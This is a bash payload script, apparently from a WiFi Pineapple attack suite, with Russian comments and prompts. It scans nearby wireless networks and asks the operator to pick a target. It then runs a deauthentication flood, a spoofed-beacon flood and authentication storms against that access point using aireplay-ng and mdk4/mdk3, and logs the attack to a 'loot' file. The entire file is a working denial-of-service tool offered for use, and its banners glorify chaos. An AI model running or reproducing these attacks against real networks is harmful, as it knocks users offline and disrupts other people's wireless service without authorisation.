#!/bin/bash
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
#═══════════════════════════════════════════════════════════════════════════════
# BANSHEE - Широковещательная Атака Сетевого Сигнала Харассер и Элиминатор Окружения
# Разработано: bad-antics
# 
# Мульти-векторный хаос - бьет по всему сразу с кричащими атаками
#═══════════════════════════════════════════════════════════════════════════════

# FIX: UI PATH and fallbacks
export PATH=/usr/sbin:/sbin:/bin:/mmc/usr/sbin:/mmc/usr/bin:$PATH
command -v PROMPT >/dev/null 2>&1 || PROMPT() { echo "$1"; read -p "Press Enter: "; }
command -v ERROR_DIALOG >/dev/null 2>&1 || ERROR_DIALOG() { echo "ERROR: $1" >&2; exit 1; }
command -v LOG >/dev/null 2>&1 || LOG() { echo "[LOG] $1"; }
command -v SPINNER_START >/dev/null 2>&1 || SPINNER_START() { echo "[*] $1"; }
command -v SPINNER_STOP >/dev/null 2>&1 || SPINNER_STOP() { echo "[✓] Done"; }
command -v NUMBER_PICKER >/dev/null 2>&1 || NUMBER_PICKER() { echo "$1"; read -p "Choice: " choice; echo "${choice:-$2}"; }
command -v CONFIRMATION_DIALOG >/dev/null 2>&1 || CONFIRMATION_DIALOG() { echo "$1"; read -p "Confirm (y/n): " confirm; [ "$confirm" = "y" ] && echo "0" || echo "1"; }

# Автоопределение правильного беспроводного интерфейса (самодельное, без внешних библиотек)
nullsec_require_iface() {
    for iface in wlan1mon mon0 wlan0mon; do
        if [ -d "/sys/class/net/$iface" ]; then
            export IFACE="$iface"
            return 0
        fi
    done
    # Пытаемся создать mon0 сами
    iw dev wlan0 interface add mon0 type monitor 2>/dev/null
    if [ -d "/sys/class/net/mon0" ]; then
        ifconfig mon0 up
        export IFACE="mon0"
        return 0
    fi
    ERROR_DIALOG "Интерфейс монитора не найден и не может быть создан!"
    return 1
}

nullsec_require_iface || exit 1

LOOT_DIR="/mmc/nullsec/banshee"
mkdir -p "$LOOT_DIR"

PROMPT "    ╔╗ ╔═╗╔╗╔╔═╗╦ ╦╔═╗╔═╗
    ╠╩╗╠═╣║║║╚═╗╠═╣║╣ ║╣ 
    ╚═╝╩ ╩╝╚╝╚═╝╩ ╩╚═╝╚═╝
━━━━━━━━━━━━━━━━━━━━━━━━━
Беспроводной Вой

Мульти-векторная атака,
которая кричит через
все частоты.

ХАОС ВОПЛОЩЕННЫЙ
━━━━━━━━━━━━━━━━━━━━━━━━━
Разработано: bad-antics
Нажмите OK, чтобы КРИЧАТЬ."

# Сканирование целей (упрощённое, без внешних сканеров)
echo "Сканируем сети 10 секунд..."
timeout 10 airodump-ng $IFACE --band abg -w /tmp/banshee_scan --output-format csv >/dev/null 2>&1
CSV_FILE="/tmp/banshee_scan-01.csv"
if [ ! -f "$CSV_FILE" ]; then
    ERROR_DIALOG "Не удалось отсканировать сети. Убедитесь, что интерфейс $IFACE активен."
    exit 1
fi

# Парсим CSV, показываем список сетей пользователю
LIST=""
while IFS=',' read -r bssid x1 x2 channel x3 x4 x5 x6 power x7 x8 x9 x10 essid rest; do
    bssid=$(echo "$bssid" | tr -d ' ')
    [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
    essid=$(echo "$essid" | tr -d ' ' | head -c 20)
    [ -z "$essid" ] && essid="[Hidden]"
    LIST="${LIST}${essid} (${bssid})\n"
done < "$CSV_FILE"

if [ -z "$LIST" ]; then
    ERROR_DIALOG "Сети не найдены."
    exit 1
fi

echo -e "Доступные сети:\n$LIST"
TARGET_SSID=$(TEXT_PICKER "Введите SSID цели:" "")
[ -z "$TARGET_SSID" ] && exit 1

# Находим BSSID и канал по SSID
SELECTED_BSSID=""
SELECTED_CHANNEL=""
while IFS=',' read -r bssid x1 x2 channel x3 x4 x5 x6 power x7 x8 x9 x10 essid rest; do
    bssid=$(echo "$bssid" | tr -d ' ')
    essid_clean=$(echo "$essid" | tr -d ' ')
    [[ "$essid_clean" == "$TARGET_SSID" ]] && SELECTED_BSSID="$bssid" && SELECTED_CHANNEL="$channel"
done < "$CSV_FILE"

if [ -z "$SELECTED_BSSID" ]; then
    ERROR_DIALOG "Цель не найдена: $TARGET_SSID"
    exit 1
fi

PROMPT "ЦЕЛЬ ЗАФИКСИРОВАНА:
$TARGET_SSID ($SELECTED_BSSID)
Канал: $SELECTED_CHANNEL

РЕЖИМЫ BANSHEE:
1. Вой (потоп деаутентификации)
2. Визг (хаос маяков) - ТРЕБУЕТ mdk4/mdk3
3. Выть (бури аутентификации) - ТРЕБУЕТ mdk4/mdk3
4. Крик (ВСЕ атаки)

Выберите ваш крик..."

MODE=$(NUMBER_PICKER "Режим (1-4):" 4)
DURATION=$(NUMBER_PICKER "Длительность (сек):" 60)

INTERFACE="$IFACE"
MON_IF="$INTERFACE"

# Устанавливаем канал
iw dev $MON_IF set channel $SELECTED_CHANNEL

LOOT_FILE="$LOOT_DIR/banshee_$(date +%Y%m%d_%H%M%S).txt"
cat > "$LOOT_FILE" << EOF
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 BANSHEE - Журнал Атаки
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Цель: $TARGET_SSID ($SELECTED_BSSID)
 Канал: $SELECTED_CHANNEL
 Режим: $MODE
 Длительность: ${DURATION}с
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 NullSec Pineapple Suite | Разработано: bad-antics
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
EOF

LOG "BANSHEE ВОЕТ..."
SPINNER_START "Кричу на $TARGET_SSID..."

launch_wail() {
    timeout $DURATION aireplay-ng --deauth 0 -a $SELECTED_BSSID $MON_IF >/dev/null 2>&1 &
    echo "[$(date)] ВОЙ: Потоп деаутентификации на $SELECTED_BSSID" >> "$LOOT_FILE"
}

launch_shriek() {
    # Потоп маяков с вариациями SSID цели
    for i in {1..10}; do
        FAKE_SSID="${TARGET_SSID:0:$((${#TARGET_SSID}-2))}$RANDOM"
        echo "$FAKE_SSID" >> /tmp/banshee_beacons.txt
    done
    if command -v mdk4 &>/dev/null; then
        timeout $DURATION mdk4 $MON_IF b -f /tmp/banshee_beacons.txt -s 1000 2>/dev/null &
    elif command -v mdk3 &>/dev/null; then
        timeout $DURATION mdk3 $MON_IF b -f /tmp/banshee_beacons.txt -s 1000 2>/dev/null &
    else
        echo "[$(date)] ВИЗГ: mdk4/mdk3 не установлен, пропускаем" >> "$LOOT_FILE"
    fi
    echo "[$(date)] ВИЗГ: Хаос маяков запущен" >> "$LOOT_FILE"
}

launch_howl() {
    # Бури аутентификации
    if command -v mdk4 &>/dev/null; then
        timeout $DURATION mdk4 $MON_IF a -a $SELECTED_BSSID -m 2>/dev/null &
    elif command -v mdk3 &>/dev/null; then
        timeout $DURATION mdk3 $MON_IF a -a $SELECTED_BSSID -m 2>/dev/null &
    else
        echo "[$(date)] ВЫТЬ: mdk4/mdk3 не установлен, пропускаем" >> "$LOOT_FILE"
    fi
    echo "[$(date)] ВЫТЬ: Буря аутентификации на $SELECTED_BSSID" >> "$LOOT_FILE"
}

case $MODE in
    1) launch_wail ;;
    2) launch_shriek ;;
    3) launch_howl ;;
    4)
        launch_wail
        launch_shriek
        launch_howl
        ;;
esac

sleep $DURATION

SPINNER_STOP

echo "" >> "$LOOT_FILE"
echo "[$(date)] BANSHEE замолчал после ${DURATION}с" >> "$LOOT_FILE"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" >> "$LOOT_FILE"
echo " NullSec Pineapple Suite | Разработано: bad-antics" >> "$LOOT_FILE"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" >> "$LOOT_FILE"

# Очистка
pkill -f "aireplay\|mdk" 2>/dev/null
rm -f /tmp/banshee_beacons.txt

PROMPT "BANSHEE ЗАМОЛЧАЛ
━━━━━━━━━━━━━━━━━━━━━━━━━
Крик останавливается.

Цель: $TARGET_SSID
Длительность: ${DURATION}с
Режим: $MODE

Хаос выпущен.

Журнал: $LOOT_FILE
━━━━━━━━━━━━━━━━━━━━━━━━━
Разработано: bad-antics"
